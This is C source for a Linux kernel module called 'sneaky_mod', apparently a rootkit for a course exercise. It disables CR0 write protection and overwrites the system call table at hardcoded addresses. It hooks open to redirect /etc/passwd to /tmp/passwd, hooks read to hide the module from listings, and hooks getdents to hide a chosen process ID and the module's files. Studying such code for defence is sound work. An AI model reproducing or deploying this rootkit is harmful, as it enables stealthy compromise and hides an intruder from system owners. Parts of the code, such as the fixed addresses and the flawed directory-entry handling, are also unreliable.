#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/uaccess.h>
#include <linux/slab.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define MODULE_NAME "sneaky_mod"


/*
module_param(foo, int 0000)
First param is parameter's name
Second param is data type
Third param is permission bits
*/

static int myPID = 999;
char* sneaky_path = "/tmp/passwd";

module_param(myPID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

struct linux_dirent{
  u64			d_ino;
  s64			d_off;
  unsigned short 	d_reclen;
  char			d_name[];
};

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff8105be20;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff8105bdc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_read)(int fd, char *buf, size_t count);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  //printk(KERN_INFO "Very, very Sneaky!\n");

  if(strcmp(pathname, "/etc/passwd") == 0){
    printk(KERN_INFO "/etc/passwd detected\n");
    copy_to_user((void*)pathname, sneaky_path, strlen(sneaky_path));
  }

  return original_call(pathname, flags);
}

asmlinkage int sneaky_read(int fd, char *buf, size_t count)
{
  unsigned int ret;
  char *tmp;
  ret = original_read(fd, buf, count);
  if(strnstr(buf, MODULE_NAME, strlen(MODULE_NAME))){
    printk(KERN_INFO "SNEAKY MOD DETECTED!%s\n", buf);
    tmp = buf;
    while(*tmp && *tmp != '\n'){
	*tmp = ' ';
	tmp++;
    }
    //memcpy(tmp, buf, (buf + ret) - tmp);
    memmove(buf, (char *) tmp, ret);
   // ret = ret - (tmp - buf);
    printk(KERN_INFO "SNEAKY MOD DETECTED!%s\n", buf);
    return ret;


	
  }
  return ret;
}

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  char pid[100];
  unsigned int ret;
  struct linux_dirent *alt_dirp, *cur_dirp;
  int i;
  ret = original_getdents(fd, dirp, count);
  sprintf(pid, "%d", myPID);


  if(ret>0){
    alt_dirp = (struct linux_dirent *) kmalloc(ret, GFP_KERNEL);
    memcpy(alt_dirp, dirp, ret);
    cur_dirp = alt_dirp;
    i = ret; //number of bytes read
    while(i>0){
	i-=cur_dirp->d_reclen;

		if(strcmp( (char*) &(cur_dirp->d_name), (char*) pid) == 0){
			printk(KERN_INFO "!!!! PID FOUND !!!! %s\n", cur_dirp->d_name);
			
			if(i !=0 ){
				memmove(cur_dirp, (char *) cur_dirp + cur_dirp->d_reclen, i);
			}
			else{
				cur_dirp->d_off = 1024;
				ret -= cur_dirp->d_reclen;
			}
			if(cur_dirp->d_reclen == 0){
				ret -=i;
				i=0;
			}
			if(i!=0){
				cur_dirp = (struct linux_dirent *) ( (char *) cur_dirp + cur_dirp->d_reclen );
			}
			memcpy(dirp, alt_dirp, ret);
			kfree(alt_dirp);
			return ret;
		}

		if(strstr( (char*) &(cur_dirp->d_name), MODULE_NAME) != NULL  )
		{
			if(i!=0){
			//	memmove(cur_dirp, (char *) cur_dirp + cur_dirp->d_reclen, i);
			}
			else{
				cur_dirp->d_off = 1024;
			}
			ret -=cur_dirp->d_reclen;
		}
		if(cur_dirp->d_reclen == 0){
			ret -=i;
			i =0;
		}
		if(i != 0){
			cur_dirp = (struct linux_dirent *) ( (char *) cur_dirp + cur_dirp->d_reclen );
		}

		memcpy(dirp, alt_dirp, ret);
    }
	kfree(alt_dirp);
  }
  return ret;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "LOADING PID=%d\n", myPID);

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  *(sys_call_table + __NR_read) = (unsigned long)original_read;

  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

